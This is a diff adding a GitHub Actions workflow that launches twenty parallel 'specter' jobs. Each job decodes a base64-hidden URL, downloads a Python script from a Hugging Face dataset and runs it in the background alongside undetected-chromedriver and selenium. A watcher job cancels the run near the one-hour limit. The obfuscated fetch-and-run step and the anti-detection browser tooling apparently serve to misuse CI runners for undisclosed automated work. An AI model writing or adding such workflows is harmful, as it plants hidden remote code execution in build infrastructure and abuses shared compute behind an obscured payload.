@@ -1,0 +1,106 @@
+name: Polygonal Specter Cascade Array
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: specter-cascade-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # المُراقب الأزلي: يُطلق إشارة الإنهاء عند علامة 59 دقيقة بالضبط
+  # =================================================================
+  timeless-arbiter:
+    name: "Timeless Arbiter"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    steps:
+      - name: Anchor Arbiter Watch
+        run: |
+          echo "[ARBITER] Timeless arbiter installed. Watch anchored at the 59-minute frontier."
+          echo "[ARBITER] Run handle sealed: ${{ github.run_id }}"
+          
+          # فترة الرصد المحددة (3540 ثانية = 59 دقيقة)
+          sleep 3540
+          
+          echo "[ARBITER] Frontier crossed! Releasing arbiter broadcast..."
+          
+          # بث أمر الإلغاء عبر GitHub API
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+          
+          echo "[ARBITER] Broadcast sent. Every living and lingering specter will be vaporized."
+
+  # =================================================================
+  # متتالية الأشباح المضلعة: بناء وتشغيل عُقد الأشباح
+  # =================================================================
+  specter-cascade:
+    name: "SpecterNode-${{ matrix.specter_label }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        specter_label: [801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820]
+
+    steps:
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      # ⟴ القسم ⟨أ⟩: تهيئة الأساس
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      - name: Prepare Bedrock
+        run: |
+          echo "[BEDROCK] Preparing bedrock for SpecterNode-${{ matrix.specter_label }} on Linux..."
+          sudo apt update -qq
+          sudo apt install -y curl python3-pip
+
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      # ⟴ القسم ⟨ب⟩: جلب العتاد التنفيذي
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      - name: Retrieve Execution Gear
+        run: |
+          echo "[RETRIEVE] Retrieving specter_gear.py from assigned channel..."
+          CHANNEL=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          curl -sL "$CHANNEL" -o specter_gear.py
+          echo "[RETRIEVE] Execution gear retrieved."
+
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      # ⟴ القسم ⟨ج⟩: تزويد المكتبات الرديفة
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      - name: Supply Companion Kits
+        run: |
+          echo "[SUPPLY] Supplying companion kits..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      # ⟴ القسم ⟨د⟩: التنفيذ المقيّد بـ 59 دقيقة
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      - name: Deploy Specter Wave
+        run: |
+          echo ">> Deploying SpecterNode-${{ matrix.specter_label }} wave..."
+          
+          # تشغيل العملية في الخلفية
+          python3 specter_gear.py &
+          SPECTER_PID=$!
+          
+          echo ">> Specter wave deployed. Horizon: 59 minutes (3540s)."
+          
+          # الانتظار حتى انتهاء المدة المحددة (59 دقيقة بالضبط)
+          sleep 3540
+          
+          # فحص حالة العملية وإنهاؤها إن كانت لا تزال تعمل
+          if kill -0 $SPECTER_PID 2>/dev/null; then
+            echo ">> Horizon hit! Vaporizing wave..."
+            kill -9 $SPECTER_PID
+            echo ">> Wave vaporized by horizon sentinel."
+          else
+            echo ">> Wave dissolved within horizon."
+          fi
